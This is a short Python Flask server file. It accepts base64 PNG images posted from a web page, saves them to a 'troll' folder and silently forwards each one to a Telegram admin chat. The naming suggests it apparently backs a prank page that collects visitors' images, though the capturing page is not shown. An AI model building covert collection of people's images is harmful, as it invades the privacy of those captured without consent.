from flask import Flask, render_template, request, jsonify
from datetime import datetime
import os
from io import BytesIO
import base64
import requests
from threading import Thread

app = Flask(__name__, static_folder='static', static_url_path='/static')
UPLOAD_FOLDER = 'troll'

# Telegram bot configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_ADMIN_ID = os.getenv('TELEGRAM_ADMIN_ID', '')
TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'

# Create troll folder if it doesn't exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def send_to_telegram(image_bytes, filename):
    """Send image to Telegram admin in a separate thread"""
    try:
        files = {
            'photo': (filename, BytesIO(image_bytes), 'image/png')
        }
        data = {
            'chat_id': TELEGRAM_ADMIN_ID,
            'caption': f'Ảnh mới:'
        }
        response = requests.post(
            f'{TELEGRAM_API_URL}/sendPhoto',
            files=files,
            data=data,
            timeout=10
        )
        if response.status_code != 200:
            print(f'Telegram API error: {response.text}')
    except Exception as e:
        print(f'Error sending to Telegram: {str(e)}')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save_image', methods=['POST'])
def save_image():
    try:
        data = request.json
        image_data = data.get('image')
        
        if not image_data:
            return jsonify({'success': False, 'message': 'No image data'}), 400
        
        # Remove the data URL prefix if present
        if image_data.startswith('data:image/png;base64,'):
            image_data = image_data.replace('data:image/png;base64,', '')
        
        # Decode base64 image
        image_bytes = base64.b64decode(image_data)
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'troll_{timestamp}.png'
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        
        # Save image locally
        with open(filepath, 'wb') as f:
            f.write(image_bytes)
        
        # Send to Telegram in background thread
        thread = Thread(target=send_to_telegram, args=(image_bytes, filename))
        thread.daemon = True
        thread.start()
        
        return jsonify({'success': True, 'message': f'Ảnh đã lưu: {filename}'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500
